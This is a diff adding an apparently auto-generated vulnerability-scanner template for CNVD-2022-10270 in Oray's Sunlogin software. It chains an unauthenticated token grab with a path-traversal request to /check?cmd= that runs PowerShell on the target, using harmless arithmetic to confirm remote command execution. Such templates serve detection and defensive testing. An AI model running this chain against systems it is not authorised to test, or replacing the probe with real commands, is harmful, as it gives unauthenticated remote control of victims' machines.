@@ -1,0 +1,55 @@
+id: cnvd-2022-10270
+info:
+  name: CNVD-2022-10270 Verify Haras and Command Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template verifies a vulnerability in Sunlogin software by Oray, identified as CNVD-2022-10270. The vulnerability allows unauthorized verification and potential command execution.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-03672
+
+variables:
+  randInt0: "{{rand_int(1000, 9999)}}"
+  randInt1: "{{rand_int(1000, 9999)}}"
+  expected_result: "{{to_number(randInt0) * to_number(randInt1)}}"
+
+http:
+  - id: verify-haras
+    method: GET
+    path:
+      - '{{BaseURL}}/cgi-bin/rpc?action=verify-haras'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "verify_string"
+          - "__code"
+          - "enabled"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - "\"verify_string\":\"(?P<token>\\w+)\""
+
+  - id: command-execution
+    method: GET
+    path:
+      - '{{BaseURL}}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2Fwindowspowershell%2Fv1.0%2Fpowershell+{{randInt0}}*{{randInt1}}'
+    headers:
+      Cookie: 'CID={{token}}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{expected_result}}"
+      - type: status
+        status:
+          - 200
